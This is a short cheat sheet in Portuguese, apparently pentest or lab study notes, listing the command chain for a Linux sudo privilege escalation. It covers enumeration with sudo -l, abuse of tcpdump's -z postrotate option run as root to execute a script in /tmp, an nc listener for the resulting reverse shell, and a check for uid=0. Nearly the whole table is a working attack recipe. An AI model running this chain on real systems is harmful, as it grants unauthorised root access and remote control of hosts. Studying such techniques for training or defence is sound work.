# Comandos Principais - Sudo Abuse

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `sudo -l` | Enumerar privilégios sudo do usuário atual | Lista de comandos permitidos (com/sem senha) |
| `man tcpdump` | Identificar opções potencialmente abusáveis no `tcpdump` | Descoberta de flags como `-z postrotate-command` |
| `cat /tmp/.test` | Validar conteúdo do script a ser executado | Confirmação do payload/script |
| `sudo tcpdump -ln -i <iface> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Executar `tcpdump` em contexto privilegiado com rotação e comando pós-rotação | Execução do comando associado ao `-z` (se permitido) |
| `nc -lnvp 443` | Iniciar listener para receber conexão reversa | Sessão recebida no host atacante |
| `id && hostname` | Confirmar contexto da sessão obtida | Validação de privilégio (ex.: `uid=0(root)`) e host |

